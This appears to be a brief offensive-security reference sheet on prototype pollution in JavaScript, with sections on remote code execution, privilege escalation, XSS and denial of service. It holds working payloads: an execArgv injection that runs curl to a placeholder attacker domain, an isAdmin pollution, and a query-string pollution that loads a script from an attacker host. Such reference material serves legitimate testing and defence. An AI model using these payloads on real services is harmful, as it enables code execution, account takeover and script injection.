# Prototype Pollution

## Table of Contents
- [RCE](#rce)
- [Privilege Escalation](#privilege-escalation)
- [XSS](#xss)
- [Denial of Service](#denial-of-service)

## RCE

### Arbitrary commands can be executed remotely. [^1]

- Injecting Node.js CLI arguments into a child process
    1. Polluted property
        ```json
        {"__proto__": {"execArgv": ["--eval=require('child_process').execSync('curl https://[ATTACKER-DOMAIN]/')"]}}
        ```

    2. Existing call in the service
        ```javascript
        // The options object defines no execArgv of its own, so the polluted value is inherited
        child_process.fork('./worker.js');
        ```

## Privilege Escalation

### A permission check can be satisfied for every user, because a property that was never assigned is inherited from the polluted prototype.

- Granting administrative permissions
    1. Polluted property
        ```json
        {"__proto__": {"isAdmin": true}}
        ```

    2. Authorization check in the service
        ```javascript
        // Evaluates to true for every user, including ones that were never granted the role
        if (user.isAdmin) {
            deleteAllRecords();
        }
        ```

## XSS

### A script of the attacker's choosing can be loaded on a trusted origin, through an option the page never set. [^2]

- Loading an attacker-controlled script through an unset library option
    1. Polluted property
        ```
        https://[VULNERABLE-SERVICE]/?__proto__[transport_url]=https://[ATTACKER-DOMAIN]/
        ```

    2. Option lookup in the library
        ```javascript
        // The option was never configured, so the polluted value is inherited and loaded as a script
        const url = config.transport_url;
        ```

## Denial of Service

### The prototype is shared by the entire process, so a single polluted property keeps breaking requests from every user until the service is restarted.

- Breaking request handling for all users
    - PortSwigger's research (by Gareth Heyes), [Server-side prototype pollution: Black-box detection without the DoS](https://portswigger.net/research/server-side-prototype-pollution)

[^1]: Applies when the service later spawns a child process without explicitly setting the polluted option.
[^2]: Based on the Google Analytics gadget.
